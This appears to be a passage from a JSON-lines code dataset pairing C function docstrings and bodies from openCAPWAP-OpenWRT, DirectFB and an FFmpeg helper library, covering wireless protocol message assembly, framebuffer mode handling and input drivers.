"iosifpeterfi/openCAPWAP-OpenWRT", "stars": 175, "license": "other", "language": "c", "size": 7168}
{"docstring": "/*Update 2009:\n    Added values to args... values is used to determine if we have some\n    payload (in this case only vendor and only UCI) to send back with the\n    configuration update response*/\n", "func_signal": "CWBool CWAssembleConfigurationUpdateResponse(CWProtocolMessage ** messagesPtr,\n\t\t\t\t\t     int *fragmentsNumPtr,\n\t\t\t\t\t     int PMTU,\n\t\t\t\t\t     int seqNum,\n\t\t\t\t\t     CWProtocolResultCode resultCode,\n\t\t\t\t\t     CWProtocolConfigurationUpdateRequestValues values)", "code": "{\n\n\tCWProtocolMessage *msgElems = NULL;\n\tconst int msgElemCount = 1;\n\tCWProtocolMessage *msgElemsBinding = NULL;\n\tconst int msgElemBindingCount = 0;\n\tCWProtocolVendorSpecificValues *protoValues = NULL;\n\n\t/*Get protocol data if we have it */\n\tif (values.protocolValues)\n\t\tprotoValues = (CWProtocolVendorSpecificValues *) values.protocolValues;\n\n\tif (messagesPtr == NULL || fragmentsNumPtr == NULL)\n\t\treturn CWErrorRaise(CW_ERROR_WRONG_ARG, NULL);\n\n\tCWLog(\"Assembling Configuration Update Response...\");\n\n\tCW_CREATE_OBJECT_ERR(msgElems, CWProtocolMessage, return CWErrorRaise(CW_ERROR_OUT_OF_MEMORY, NULL);\n\t    );\n\n\tif (protoValues) {\n\t\tswitch (protoValues->vendorPayloadType) {\n\t\tcase CW_MSG_ELEMENT_VENDOR_SPEC_PAYLOAD_UCI:\n\t\tcase CW_MSG_ELEMENT_VENDOR_SPEC_PAYLOAD_WUM:\n\t\t\tif (!(CWAssembleVendorMsgElemResultCodeWithPayload(msgElems, resultCode, protoValues))) {\n\t\t\t\tCW_FREE_OBJECT(msgElems);\n\t\t\t\treturn CW_FALSE;\n\t\t\t}\n\n\t\t\tbreak;\n\n\t\tdefault:\n\t\t\t/*Result Code only */\n\t\t\tif (!(CWAssembleMsgElemResultCode(msgElems, resultCode))) {\n\t\t\t\tCW_FREE_OBJECT(msgElems);\n\t\t\t\treturn CW_FALSE;\n\t\t\t}\n\t\t}\n\t} else {\n\t\t/*Result Code only */\n\t\tif (!(CWAssembleMsgElemResultCode(msgElems, resultCode))) {\n\t\t\tCW_FREE_OBJECT(msgElems);\n\t\t\treturn CW_FALSE;\n\t\t}\n\t}\n\n\tif (!(CWAssembleMessage(messagesPtr,\n\t\t\t\tfragmentsNumPtr,\n\t\t\t\tPMTU,\n\t\t\t\tseqNum,\n\t\t\t\tCW_MSG_TYPE_VALUE_CONFIGURE_UPDATE_RESPONSE,\n\t\t\t\tmsgElems, msgElemCount, msgElemsBinding, msgElemBindingCount)))\n\t\treturn CW_FALSE;\n\n\tCWLog(\"Configuration Update Response Assembled\");\n\n\treturn CW_TRUE;\n}", "path": "WTPRunState.c", "repo_name": "iosifpeterfi/openCAPWAP-OpenWRT", "stars": 175, "license": "other", "language": "c", "size": 7168}
{"docstring": "/*set CWMIN*/\n", "func_signal": "int set_wme_cwmin(int class, int value)", "code": "{\n\tedcf_acparam_t params[AC_COUNT];\n\tchar *buf = wlbuf;\n\tchar *type;\n\n\ttype = malloc(20 * sizeof(char));\n\tstrcpy(type, \"wme_ac_ap\");\n\n\tmemset(params, 0, sizeof(params));\n\twl_iovar_get(interface, type, params, sizeof(params));\n\n\tstrcpy(buf, type);\n\tbuf += strlen(buf) + 1;\n\n\tparams[class].ECW = (params[class].ECW & ~(0xf)) | (value & 0xf);\n\tmemcpy(buf, &params[class], sizeof(edcf_acparam_t));\n\n\tif (wl_ioctl(interface, WLC_SET_VAR, wlbuf, BUFSIZE) < 0) {\n\t\tperror(\"Ioctl error\");\n\t\treturn (0);\n\t}\n\n\tprintf(\"\\nCWMIN impostato a: %d\\n\", value);\n\treturn 1;\n}", "path": "WTPBcmDriverInteraction.c", "repo_name": "iosifpeterfi/openCAPWAP-OpenWRT", "stars": 175, "license": "other", "language": "c", "size": 7168}
{"docstring": "/*--------------------------- Max. number of associated clients ---------------------------*/\n", "func_signal": "int set_maxassoc(int value)", "code": "{\n\tchar *iov_type;\n\n\tiov_type = malloc(20 * sizeof(char));\n\tstrcpy(iov_type, \"maxassoc\");\n\n\tif (wl_iovar_setint(interface, iov_type, value) < 0) {\n\t\tperror(\"Ioctl error\");\n\t\treturn (0);\n\t}\n\n\tprintf(\"\\nMax. number of associated clients impostato a: %d\\n\", value);\n\treturn 1;\n}", "path": "WTPBcmDriverInteraction.c", "repo_name": "iosifpeterfi/openCAPWAP-OpenWRT", "stars": 175, "license": "other", "language": "c", "size": 7168}
{"docstring": "/*\n * Simple job: see if we have a thread that is serving address *addressPtr\n */\n", "func_signal": "__inline__ int CWWTPByAddress(CWNetworkLev4Address * addressPtr, CWSocket sock)", "code": "{\n\n\tint i;\n\tif (addressPtr == NULL)\n\t\treturn -1; \n\n\tCWThreadMutexLock(&gWTPsMutex);\n\tfor (i = 0; i < gMaxWTPs; i++) {\n\n\t\tif (gWTPs[i].isNotFree &&\n\t\t    &(gWTPs[i].address) != NULL &&\n\t\t    !sock_cmp_addr((struct sockaddr *)addressPtr,\n\t\t\t\t   (struct sockaddr *)&(gWTPs[i].address), sizeof(CWNetworkLev4Address))) {\n\n\t\t\t/* we treat a WTP that sends packet to a different\n\t\t\t * AC's interface as a new WTP\n\t\t\t */\n\t\t\tCWThreadMutexUnlock(&gWTPsMutex);\n\t\t\treturn i;\n\t\t}\n\t}\n\n\tCWThreadMutexUnlock(&gWTPsMutex);\n\n\treturn -1;\n}", "path": "ACMainLoop.c", "repo_name": "iosifpeterfi/openCAPWAP-OpenWRT", "stars": 175, "license": "other", "language": "c", "size": 7168}
{"docstring": "/*__________________________________________________________________*/\n/*  *******************___ASSEMBLE FUNCTIONS___*******************  */\n", "func_signal": "CWBool CWAssembleEchoRequest(CWProtocolMessage ** messagesPtr,\n\t\t\t     int *fragmentsNumPtr, int PMTU, int seqNum, CWList msgElemList)", "code": "{\n\n\tCWProtocolMessage *msgElems = NULL;\n\tconst int msgElemCount = 0;\n\tCWProtocolMessage *msgElemsBinding = NULL;\n\tconst int msgElemBindingCount = 0;\n\n\tif (messagesPtr == NULL || fragmentsNumPtr == NULL)\n\t\treturn CWErrorRaise(CW_ERROR_WRONG_ARG, NULL);\n\n\tCWLog(\"Assembling Echo Request...\");\n\n\tif (!(CWAssembleMessage(messagesPtr,\n\t\t\t\tfragmentsNumPtr,\n\t\t\t\tPMTU,\n\t\t\t\tseqNum,\n\t\t\t\tCW_MSG_TYPE_VALUE_ECHO_REQUEST,\n\t\t\t\tmsgElems, msgElemCount, msgElemsBinding, msgElemBindingCount)))\n\t\treturn CW_FALSE;\n\n\tCWLog(\"Echo Request Assembled\");\n\n\treturn CW_TRUE;\n}", "path": "WTPRunState.c", "repo_name": "iosifpeterfi/openCAPWAP-OpenWRT", "stars": 175, "license": "other", "language": "c", "size": 7168}
{"docstring": "/******************************************************************************/\n", "func_signal": "static inline\nvoid waitretrace (void)", "code": "{\n#if defined(HAVE_INB_OUTB_IOPL)\n     if (iopl(3))\n          return;\n\n     if (!(inb (0x3cc) & 1)) {\n          while ((inb (0x3ba) & 0x8))\n               ;\n\n          while (!(inb (0x3ba) & 0x8))\n               ;\n     }\n     else {\n          while ((inb (0x3da) & 0x8))\n               ;\n\n          while (!(inb (0x3da) & 0x8))\n               ;\n     }\n#endif\n}", "path": "systems\\fbdev\\fbdev.c", "repo_name": "DirectFB/directfb", "stars": 167, "license": "lgpl-2.1", "language": "c", "size": 22584}
{"docstring": "/******************************************************************************/\n", "func_signal": "static DFBResult\ninit_modes( void )", "code": "{\n     dfb_fbdev_read_modes();\n\n     if (!dfb_fbdev->shared->modes) {\n          /* try to use current mode*/\n          dfb_fbdev->shared->modes = (VideoMode*) SHCALLOC( dfb_fbdev->shared->shmpool,\n                                                            1, sizeof(VideoMode) );\n          if (!dfb_fbdev->shared->modes)\n               return D_OOSHM();\n\n          *dfb_fbdev->shared->modes = dfb_fbdev->shared->current_mode;\n\n          if (dfb_fbdev_test_mode_simple(dfb_fbdev->shared->modes)) {\n               D_ERROR(\"DirectFB/FBDev: \"\n                        \"No supported modes found in /etc/fb.modes and \"\n                        \"current mode not supported!\\n\");\n\n               D_ERROR( \"DirectFB/FBDev: Current mode's pixelformat: \"\n                         \"rgba %d/%d, %d/%d, %d/%d, %d/%d (%dbit)\\n\",\n                         dfb_fbdev->shared->orig_var.red.length,\n                         dfb_fbdev->shared->orig_var.red.offset,\n                         dfb_fbdev->shared->orig_var.green.length,\n                         dfb_fbdev->shared->orig_var.green.offset,\n                         dfb_fbdev->shared->orig_var.blue.length,\n                         dfb_fbdev->shared->orig_var.blue.offset,\n                         dfb_fbdev->shared->orig_var.transp.length,\n                         dfb_fbdev->shared->orig_var.transp.offset,\n                         dfb_fbdev->shared->orig_var.bits_per_pixel );\n\n               return DFB_INIT;\n          }\n     }\n\n     return DFB_OK;\n}", "path": "systems\\fbdev\\fbdev.c", "repo_name": "DirectFB/directfb", "stars": 167, "license": "lgpl-2.1", "language": "c", "size": 22584}
{"docstring": "/**********************************************************************************************************************/\n", "func_signal": "static void\nsystem_get_info( CoreSystemInfo *info )", "code": "{\n     info->type = CORE_X11VDPAU;\n     info->caps = CSCAPS_ACCELERATION | CSCAPS_PREFER_SHM;\n\n     D_DEBUG_AT( X11_Core, \"%s()\\n\", __FUNCTION__ );\n\n     snprintf( info->name, DFB_CORE_SYSTEM_INFO_NAME_LENGTH, \"X11\" );\n}", "path": "systems\\x11vdpau\\x11.c", "repo_name": "DirectFB/directfb", "stars": 167, "license": "lgpl-2.1", "language": "c", "size": 22584}
{"docstring": "/*\n * Input thread reading from device.\n * Generates events on incoming data.\n */\n", "func_signal": "static void*\nosxEventThread( DirectThread *thread, void *driver_data )", "code": "{\n     OSXInputData *data    = (OSXInputData*) driver_data;\n     DFBOSX       *dfb_osx = data->dfb_osx;\n\n     while (!data->stop) {\n          DFBInputEvent evt;\n          EventRecord   event;\n\n          fusion_skirmish_prevail( &dfb_osx->lock );\n\n          /* Check for events */\n          while ( WaitNextEvent( everyEvent, &event, 0, nil) ) {\n               fusion_skirmish_dismiss( &dfb_osx->lock );\n\n               switch (event.what) {\n                    case keyDown:\n                    case keyUp:\n                    case autoKey:\n                         if (event.what == keyUp)\n                              evt.type = DIET_KEYRELEASE;\n                         else\n                              evt.type = DIET_KEYPRESS;\n\n                         if (translate_key( event.message & (charCodeMask | keyCodeMask), &evt )) {\n                              dfb_input_dispatch( data->device, &evt );\n                         }\n\n                         break;\n                    case mouseDown:\n                         evt.type = DIET_BUTTONPRESS;\n                         evt.button = DIBI_LEFT;\n                         dfb_input_dispatch( data->device, &evt );\n                         break;\n                    case mouseUp:\n                         evt.type = DIET_BUTTONRELEASE;\n                         evt.button = DIBI_LEFT;\n                         dfb_input_dispatch( data->device, &evt );\n                         break;\n                    default:\n                         printf(\"%d\\n\",event.what);\n                         break;\n               }\n\n               fusion_skirmish_prevail( &dfb_osx->lock );\n          }\n\n          fusion_skirmish_dismiss( &dfb_osx->lock );\n\n          usleep(10000);\n\n          direct_thread_testcancel( thread );\n     }\n\n     return NULL;\n}", "path": "systems\\osx\\osxinput.c", "repo_name": "DirectFB/directfb", "stars": 167, "license": "lgpl-2.1", "language": "c", "size": 22584}
{"docstring": "/*\n * Fill out general information about this driver.\n * Called once during initialization of DirectFB.\n */\n", "func_signal": "static void\ndriver_get_info( InputDriverInfo *info )", "code": "{\n     /* fill driver info structure */\n     snprintf ( info->name,\n                DFB_INPUT_DRIVER_INFO_NAME_LENGTH, \"OSX Input Driver\" );\n     snprintf ( info->vendor,\n                DFB_INPUT_DRIVER_INFO_VENDOR_LENGTH, \"Andreas Hundt\" );\n\n     info->version.major = 0;\n     info->version.minor = 1;\n}", "path": "systems\\osx\\osxinput.c", "repo_name": "DirectFB/directfb", "stars": 167, "license": "lgpl-2.1", "language": "c", "size": 22584}
{"docstring": "/*\n * parses video modes in /etc/fb.modes and stores them in dfb_fbdev->shared->modes\n * (to be replaced by DirectFB's own config system\n */\n", "func_signal": "static DFBResult\ndfb_fbdev_read_modes( void )", "code": "{\n     FILE        *fp;\n     char         line[80],label[32],value[16];\n     int          geometry=0, timings=0;\n     int          dummy;\n     VideoMode    temp_mode;\n     FBDevShared *shared = dfb_fbdev->shared;\n     VideoMode   *prev   = shared->modes;\n\n     D_DEBUG_AT( FBDev_Mode, \"%s()\\n\", __FUNCTION__ );\n\n     if (!(fp = fopen(\"/etc/fb.modes\",\"r\")))\n          return errno2result( errno );\n\n     while (fgets(line,79,fp)) {\n          if (sscanf(line, \"mode \\\"%31[^\\\"]\\\"\",label) == 1) {\n               memset( &temp_mode, 0, sizeof(VideoMode) );\n\n               geometry = 0;\n               timings = 0;\n\n               while (fgets(line,79,fp) && !(strstr(line,\"endmode\"))) {\n                    if (5 == sscanf(line,\" geometry %d %d %d %d %d\", &temp_mode.xres, &temp_mode.yres, &dummy, &dummy, &temp_mode.bpp)) {\n                         geometry = 1;\n                    }\n                    else if (7 == sscanf(line,\" timings %d %d %d %d %d %d %d\", &temp_mode.pixclock, &temp_mode.left_margin,  &temp_mode.right_margin,\n                                         &temp_mode.upper_margin, &temp_mode.lower_margin, &temp_mode.hsync_len,    &temp_mode.vsync_len)) {\n                         timings = 1;\n                    }\n                    else if (1 == sscanf(line, \" hsync %15s\",value) && 0 == strcasecmp(value,\"high\")) {\n                         temp_mode.hsync_high = 1;\n                    }\n                    else if (1 == sscanf(line, \" vsync %15s\",value) && 0 == strcasecmp(value,\"high\")) {\n                         temp_mode.vsync_high = 1;\n                    }\n                    else if (1 == sscanf(line, \" csync %15s\",value) && 0 == strcasecmp(value,\"high\")) {\n                         temp_mode.csync_high = 1;\n                    }\n                    else if (1 == sscanf(line, \" laced %15s\",value) && 0 == strcasecmp(value,\"true\")) {\n                         temp_mode.laced = 1;\n                    }\n                    else if (1 == sscanf(line, \" double %15s\",value) && 0 == strcasecmp(value,\"true\")) {\n                         temp_mode.doubled = 1;\n                    }\n                    else if (1 == sscanf(line, \" gsync %15s\",value) && 0 == strcasecmp(value,\"true\")) {\n                         temp_mode.sync_on_green = 1;\n                    }\n                    else if (1 == sscanf(line, \" extsync %15s\",value) && 0 == strcasecmp(value,\"true\")) {\n                         temp_mode.external_sync = 1;\n                    }\n                    else if (1 == sscanf(line, \" bcast %15s\",value) && 0 == strcasecmp(value,\"true\")) {\n                         temp_mode.broadcast = 1;\n                    }\n               }\n\n               if (geometry && timings && !dfb_fbdev_test_mode_simple(&temp_mode)) {\n                    VideoMode *mode = SHCALLOC( shared->shmpool, 1, sizeof(VideoMode) );\n                    if (!mode) {\n                         D_OOSHM();\n                         continue;\n                    }\n\n                    if (!prev)\n                         shared->modes = mode;\n                    else\n                         prev->next = mode;\n\n                    direct_memcpy (mode, &temp_mode, sizeof(VideoMode));\n\n                    prev = mode;\n\n                    D_DEBUG_AT( FBDev_Mode, \" +-> %16s %4dx%4d  %s%s\\n\", label, temp_mode.xres, temp_mode.yres,\n                                temp_mode.laced ? \"interlaced \" : \"\", temp_mode.doubled ? \"doublescan\" : \"\" );\n               }\n          }\n     }\n\n     fclose (fp);\n\n     return DFB_OK;\n}", "path": "systems\\fbdev\\fbdev.c", "repo_name": "DirectFB/directfb", "stars": 167, "license": "lgpl-2.1", "language": "c", "size": 22584}
{"docstring": "/*\n * Constructor\n *\n * Fills in function pointers and intializes data structure.\n */\n", "func_signal": "static DirectResult\nConstruct( IFusionDale *thiz, const char *host, int session )", "code": "{\n     DirectResult ret;\n\n     DIRECT_ALLOCATE_INTERFACE_DATA(thiz, IFusionDale_Requestor)\n\n     data->ref = 1;\n\n     ret = voodoo_client_create( host, session, &data->client );\n     if (ret) {\n          DIRECT_DEALLOCATE_INTERFACE( thiz );\n          return ret;\n     }\n\n     data->manager = voodoo_client_manager( data->client );\n\n     ret = voodoo_manager_super( data->manager, \"IFusionDale\", &data->instance );\n     if (ret) {\n          voodoo_client_destroy( data->client );\n          DIRECT_DEALLOCATE_INTERFACE( thiz );\n          return ret;\n     }\n\n     thiz->AddRef        = IFusionDale_Requestor_AddRef;\n     thiz->Release       = IFusionDale_Requestor_Release;\n     thiz->EnterComa     = IFusionDale_Requestor_EnterComa;\n\n     return DR_OK;\n}", "path": "proxy\\requestor\\ifusiondale_requestor.c", "repo_name": "DirectFB/directfb", "stars": 167, "license": "lgpl-2.1", "language": "c", "size": 22584}
{"docstring": "/**********************************************************************************************************************/\n", "func_signal": "static int\nX11_VDPAU_Dispatch_OutputSurfaceCreate( DFBX11                        *x11,\n                                        DFBX11CallOutputSurfaceCreate *create )", "code": "{\n     DFBX11VDPAU *vdp = &x11->vdp;\n\n     VdpStatus        status;\n     VdpOutputSurface surface;\n\n     status = vdp->OutputSurfaceCreate( vdp->device, create->rgba_format,\n                                        create->width, create->height, &surface );\n     if (status) {\n          D_ERROR( \"DirectFB/X11/VDPAU: OutputSurfaceCreate( format %u, size %dx%d ) failed (status %d, '%s'!\\n\",\n                   create->rgba_format, create->width, create->height, status, vdp->GetErrorString( status ) );\n          return 0;\n     }\n\n     return (int) surface;\n}", "path": "systems\\x11vdpau\\x11.c", "repo_name": "DirectFB/directfb", "stars": 167, "license": "lgpl-2.1", "language": "c", "size": 22584}
{"docstring": "/******************************************************************************/\n", "func_signal": "static DFBResult\nprimaryInitScreen( CoreScreen           *screen,\n                   CoreGraphicsDevice   *device,\n                   void                 *driver_data,\n                   void                 *screen_data,\n                   DFBScreenDescription *description )", "code": "{\n     D_DEBUG_AT( FBDev_Primary, \"%s()\\n\", __FUNCTION__ );\n\n     /* Set the screen capabilities. */\n     description->caps = DSCCAPS_VSYNC | DSCCAPS_POWER_MANAGEMENT;\n\n     /* Set the screen name. */\n     snprintf( description->name,\n               DFB_SCREEN_DESC_NAME_LENGTH, \"FBDev Primary Screen\" );\n\n     return DFB_OK;\n}", "path": "systems\\fbdev\\fbdev.c", "repo_name": "DirectFB/directfb", "stars": 167, "license": "lgpl-2.1", "language": "c", "size": 22584}
{"docstring": "/*\n * End thread, close device and free private data.\n */\n", "func_signal": "static void\ndriver_close_device( void *driver_data )", "code": "{\n     OSXInputData *data = (OSXInputData*) driver_data;\n\n     /* stop input thread */\n     data->stop = 1;\n\n     direct_thread_join( data->thread );\n     direct_thread_destroy( data->thread );\n\n     /* free private data */\n     D_FREE ( data );\n}", "path": "systems\\osx\\osxinput.c", "repo_name": "DirectFB/directfb", "stars": 167, "license": "lgpl-2.1", "language": "c", "size": 22584}
{"docstring": "/**************************************************************************************************/\n", "func_signal": "static DirectResult\nIFusionDale_Requestor_AddRef( IFusionDale *thiz )", "code": "{\n     DIRECT_INTERFACE_GET_DATA(IFusionDale_Requestor)\n\n     data->ref++;\n\n     return DR_OK;\n}", "path": "proxy\\requestor\\ifusiondale_requestor.c", "repo_name": "DirectFB/directfb", "stars": 167, "license": "lgpl-2.1", "language": "c", "size": 22584}
{"docstring": "/*\n * Open the device, fill out information about it,\n * allocate and fill private data, start input thread.\n * Called during initialization, resuming or taking over mastership.\n */\n", "func_signal": "static DFBResult\ndriver_open_device( CoreInputDevice      *device,\n                    unsigned int      number,\n                    InputDeviceInfo  *info,\n                    void            **driver_data )", "code": "{\n     OSXInputData *data;\n     DFBOSX       *dfb_osx = dfb_system_data();\n\n     fusion_skirmish_prevail( &dfb_osx->lock );\n\n     fusion_skirmish_dismiss( &dfb_osx->lock );\n\n     /* set device name */\n     snprintf( info->desc.name,\n               DFB_INPUT_DEVICE_DESC_NAME_LENGTH, \"OSX Input\" );\n\n     /* set device vendor */\n     snprintf( info->desc.vendor,\n               DFB_INPUT_DEVICE_DESC_VENDOR_LENGTH, \"OSX\" );\n\n     /* set one of the primary input device IDs */\n     info->prefered_id = DIDID_KEYBOARD;\n\n     /* set type flags */\n     info->desc.type   = DIDTF_KEYBOARD | DIDTF_MOUSE;\n\n     /* set capabilities */\n     info->desc.caps   = DICAPS_ALL;\n\n     /* allocate and fill private data */\n     data = D_CALLOC( 1, sizeof(OSXInputData) );\n\n     data->device  = device;\n     data->dfb_osx = dfb_osx;\n\n     /* start input thread */\n     data->thread = direct_thread_create( DTT_INPUT, osxEventThread, data, \"OSX Input\" );\n\n     /* set private data pointer */\n     *driver_data = data;\n\n     return DFB_OK;\n}", "path": "systems\\osx\\osxinput.c", "repo_name": "DirectFB/directfb", "stars": 167, "license": "lgpl-2.1", "language": "c", "size": 22584}
{"docstring": "/*\n * Return the number of available devices.\n * Called once during initialization of DirectFB.\n */\n", "func_signal": "static int\ndriver_get_available( void )", "code": "{\n     if (dfb_system_type() == CORE_OSX)\n          return 1;\n\n     return 0;\n}", "path": "systems\\osx\\osxinput.c", "repo_name": "DirectFB/directfb", "stars": 167, "license": "lgpl-2.1", "language": "c", "size": 22584}
{"docstring": "/*\n * some fbdev drivers use the palette as gamma ramp in >8bpp modes, to have\n * correct colors, the gamme ramp has to be initialized.\n */\n", "func_signal": "static u16\ndfb_fbdev_calc_gamma(int n, int max)", "code": "{\n     int ret = 65535 * n / max;\n     return CLAMP( ret, 0, 65535 );\n}", "path": "systems\\fbdev\\fbdev.c", "repo_name": "DirectFB/directfb", "stars": 167, "license": "lgpl-2.1", "language": "c", "size": 22584}
{"docstring": "/** fbdev internal **/\n", "func_signal": "static void\ndfb_fbdev_var_to_mode( const struct fb_var_screeninfo *var,\n                       VideoMode                      *mode )", "code": "{\n     mode->xres          = var->xres;\n     mode->yres          = var->yres;\n     mode->bpp           = var->bits_per_pixel;\n     mode->hsync_len     = var->hsync_len;\n     mode->vsync_len     = var->vsync_len;\n     mode->left_margin   = var->left_margin;\n     mode->right_margin  = var->right_margin;\n     mode->upper_margin  = var->upper_margin;\n     mode->lower_margin  = var->lower_margin;\n     mode->pixclock      = var->pixclock;\n     mode->hsync_high    = (var->sync & FB_SYNC_HOR_HIGH_ACT) ? 1 : 0;\n     mode->vsync_high    = (var->sync & FB_SYNC_VERT_HIGH_ACT) ? 1 : 0;\n     mode->csync_high    = (var->sync & FB_SYNC_COMP_HIGH_ACT) ? 1 : 0;\n     mode->sync_on_green = (var->sync & FB_SYNC_ON_GREEN) ? 1 : 0;\n     mode->external_sync = (var->sync & FB_SYNC_EXT) ? 1 : 0;\n     mode->broadcast     = (var->sync & FB_SYNC_BROADCAST) ? 1 : 0;\n     mode->laced         = (var->vmode & FB_VMODE_INTERLACED) ? 1 : 0;\n     mode->doubled       = (var->vmode & FB_VMODE_DOUBLE) ? 1 : 0;\n}", "path": "systems\\fbdev\\fbdev.c", "repo_name": "DirectFB/directfb", "stars": 167, "license": "lgpl-2.1", "language": "c", "size": 22584}
{"docstring": "/**************************************************************************************************/\n", "func_signal": "static void\nIFusionDale_Requestor_Destruct( IFusionDale *thiz )", "code": "{\n     IFusionDale_Requestor_data *data = thiz->priv;\n\n     D_DEBUG( \"%s (%p)\\n\", __FUNCTION__, thiz );\n\n     voodoo_manager_request( data->manager, data->instance,\n                             IFUSIONDALE_METHOD_ID_Release, VREQ_NONE, NULL,\n                             VMBT_NONE );\n\n     voodoo_client_destroy( data->client );\n\n     DIRECT_DEALLOCATE_INTERFACE( thiz );\n}", "path": "proxy\\requestor\\ifusiondale_requestor.c", "repo_name": "DirectFB/directfb", "stars": 167, "license": "lgpl-2.1", "language": "c", "size": 22584}
{"docstring": "/******************************************************************************/\n", "func_signal": "static void\ndfb_fbdev_get_pci_info( FBDevShared *shared )", "code": "{\n     char  buf[512];\n     int   vendor = -1;\n     int   model  = -1;\n     FILE *fp;\n     int   bus;\n     int   dev;\n     int   func;\n     char *fbdev;\n     char  devname[5] = { 'f', 'b', '0', 0, 0 };\n     char  path[SYSFS_PATH_MAX];\n     int   len;\n\n     /* try sysfs interface */\n     fbdev = dfb_config->fb_device;\n     if (!fbdev)\n          fbdev = getenv( \"FRAMEBUFFER\" );\n\n     if (fbdev) {\n          if (!strncmp( fbdev, \"/dev/fb/\", 8 ))\n               snprintf( devname, 5, \"fb%s\", fbdev+8 );\n          else if (!strncmp( fbdev, \"/dev/fb\", 7 ))\n               snprintf( devname, 5, \"fb%s\", fbdev+7 );\n     }\n\n     snprintf(path, SYSFS_PATH_MAX, SYS_CLASS_GRAPHICS_DEV, devname);\n\n     len = readlink(path,buf,512);\n     if(len != -1) {\n          char * base;\n          buf[len] = '\\0';\n          base = basename(buf);\n\n          if (sscanf( base, \"0000:%02x:%02x.%1x\", &bus, &dev, &func ) == 3) {\n               shared->pci.bus  = bus;\n               shared->pci.dev  = dev;\n               shared->pci.func = func;\n           }\n\n          snprintf(path, SYSFS_PATH_MAX, SYS_CLASS_GRAPHICS_DEV_VENDOR, devname);\n\n          fp = fopen(path,\"r\");\n          if(fp) {\n               if(fgets(buf,512,fp)) {\n                    if(sscanf(buf,\"0x%04x\", &vendor) == 1)\n                         shared->device.vendor = vendor;\n               }\n               fclose(fp);\n          } else {\n               D_DEBUG( \"DirectFB/FBDev: \"\n                        \"couldn't access %s!\\n\", path );\n          }\n\n          snprintf(path, SYSFS_PATH_MAX, SYS_CLASS_GRAPHICS_DEV_MODEL, devname);\n\n          fp = fopen(path,\"r\");\n          if(fp) {\n               if(fgets(buf,512,fp)) {\n                    if(sscanf(buf,\"0x%04x\", &model) == 1)\n                         shared->device.model = model;\n               }\n               fclose(fp);\n          } else {\n               D_DEBUG( \"DirectFB/FBDev: \"\n                        \"couldn't access %s!\\n\", path );\n          }\n     } else {\n          D_DEBUG( \"DirectFB/FBDev: \"\n                   \"couldn't access %s!\\n\", path );\n     }\n\n     /* try /proc interface */\n     if (vendor == -1 || model == -1) {\n          int   id;\n\n          fp = fopen( \"/proc/bus/pci/devices\", \"r\" );\n          if (!fp) {\n               D_DEBUG( \"DirectFB/FBDev: \"\n                        \"couldn't access /proc/bus/pci/devices!\\n\" );\n               return;\n          }\n\n          while (fgets( buf, 512, fp )) {\n               if (sscanf( buf, \"%04x\\t%04x%04x\", &id, &vendor, &model ) == 3) {\n                    bus  = (id & 0xff00) >> 8;\n                    dev  = (id & 0x00ff) >> 3;\n                    func = (id & 0x0007);\n\n                    if (bus  == dfb_config->pci.bus &&\n                        dev  == dfb_config->pci.dev &&\n                        func == dfb_config->pci.func)\n                    {\n                         shared->pci.bus  = bus;\n                         shared->pci.dev  = dev;\n                         shared->pci.func = func;\n\n                         shared->device.vendor = vendor;\n                         shared->device.model  = model;\n\n                         break;\n                    }\n               }\n          }\n\n          fclose( fp );\n     }\n}", "path": "systems\\fbdev\\fbdev.c", "repo_name": "DirectFB/directfb", "stars": 167, "license": "lgpl-2.1", "language": "c", "size": 22584}
{"docstring": "/******************************************************************************/\n", "func_signal": "static volatile void *\nsystem_map_mmio( unsigned int    offset,\n                 int             length )", "code": "{\n     void *addr;\n\n     if (length <= 0)\n          length = dfb_fbdev->shared->fix.mmio_len;\n\n     addr = mmap( NULL, length, PROT_READ | PROT_WRITE, MAP_SHARED,\n                  dfb_fbdev->fd, dfb_fbdev->shared->fix.smem_len + offset );\n     if (addr == MAP_FAILED) {\n          D_PERROR( \"DirectFB/FBDev: Could not mmap MMIO region \"\n                     \"(offset %d, length %d)!\\n\", offset, length );\n          return NULL;\n     }\n\n     return(volatile void*) ((u8*) addr + (dfb_fbdev->shared->fix.mmio_start &\n                                           dfb_fbdev->shared->page_mask));\n}", "path": "systems\\fbdev\\fbdev.c", "repo_name": "DirectFB/directfb", "stars": 167, "license": "lgpl-2.1", "language": "c", "size": 22584}
{"docstring": "/** public **/\n", "func_signal": "static void\nsystem_get_info( CoreSystemInfo *info )", "code": "{\n     info->type = CORE_FBDEV;\n     info->caps = CSCAPS_ACCELERATION;\n\n     snprintf( info->name, DFB_CORE_SYSTEM_INFO_NAME_LENGTH, \"FBDev\" );\n}", "path": "systems\\fbdev\\fbdev.c", "repo_name": "DirectFB/directfb", "stars": 167, "license": "lgpl-2.1", "language": "c", "size": 22584}
{"docstring": "/* exported symbols */\n", "func_signal": "static int\ndriver_get_available( void )", "code": "{\n     int fd;\n     struct sockaddr_un addr;\n\n     addr.sun_family = AF_UNIX;\n     direct_snputs( addr.sun_path, \"/dev/lircd\", sizeof(addr.sun_path) );\n\n     fd = socket( PF_UNIX, SOCK_STREAM, 0 );\n     if (fd < 0)\n          return 0;\n\n     if (connect( fd, (struct sockaddr*)&addr, sizeof(addr) ) < 0) {\n          /*\n           *  for LIRC version >= 0.8.6 the Unix socket is no more created\n           *  under /dev/lircd but under /var/run/lirc/lircd\n           */\n          direct_snputs( addr.sun_path, \"/var/run/lirc/lircd\", sizeof(addr.sun_path) );\n          if (connect( fd, (struct sockaddr*)&addr, sizeof(addr) ) < 0) {\n               close( fd );\n               return 0;\n          }\n     }\n\n     close( fd );\n\n     return 1;\n}", "path": "inputdrivers\\lirc\\lirc.c", "repo_name": "DirectFB/directfb", "stars": 167, "license": "lgpl-2.1", "language": "c", "size": 22584}
{"docstring": "/**\n * Select the output stream to process.\n *\n * @return  selected output stream, or NULL if none available\n */\n", "func_signal": "static OutputStream *choose_output(void)", "code": "{\n    int i;\n    int64_t opts_min = INT64_MAX;\n    OutputStream *ost_min = NULL;\n\n    for (i = 0; i < nb_output_streams; i++) {\n        OutputStream *ost = output_streams[i];\n        int64_t opts = av_rescale_q(ost->st->cur_dts, ost->st->time_base,\n                                    AV_TIME_BASE_Q);\n        if (!ost->finished && opts < opts_min) {\n            opts_min = opts;\n            ost_min  = ost->unavailable ? NULL : ost;\n        }\n    }\n    return ost_min;\n}", "path": "library\\jni\\FFmpegNativeHelper.c", "repo_name": "dxjia/ffmpeg-commands-executor-library", "stars": 169, "license": "apache-2.0", "language": "c", "size": 12384}
